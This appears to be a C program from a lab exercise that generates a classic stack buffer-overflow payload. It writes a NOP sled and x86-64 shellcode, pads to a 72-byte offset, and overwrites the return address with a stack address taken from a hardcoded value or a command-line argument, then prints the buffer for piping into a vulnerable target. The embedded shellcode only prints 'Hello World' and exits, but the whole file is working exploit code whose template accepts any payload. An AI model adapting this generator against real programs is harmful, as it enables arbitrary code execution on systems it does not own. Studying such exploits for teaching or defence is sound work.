#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define addr_size 8
#define random_char 'a'
#define NOP 0x90

long base_addr = 0x7ffff7f97ef0;
long offset = 72;

char *shell_code = "\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x89\xc2\x48\x83\xc2\x22\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64";
char buff[1000];

char *gen_string() {
	memset(buff, 0, sizeof(buff));

	long *ret_addr = (long *)(buff + offset);
	*ret_addr = base_addr - offset + 8;
	
	int i = 0;
	while(i < 8)
		buff[i++] = NOP;
	while(i < strlen(shell_code) + 8) {
		buff[i] = shell_code[i-8];
		i++;
	}
	while(i < offset)
		buff[i++] = NOP;
	return buff;
}

int main(int argc, char *argv[]) {
	if(argc == 2)
		base_addr = strtol(argv[1], NULL, 0);
	gen_string();
	// printf("0x%lx + offset 0x%lx\n", base_addr, base_addr - offset);
	for(int i = 0; i < sizeof(buff); ++i)
		printf("%c", buff[i]);
	return 0;
}

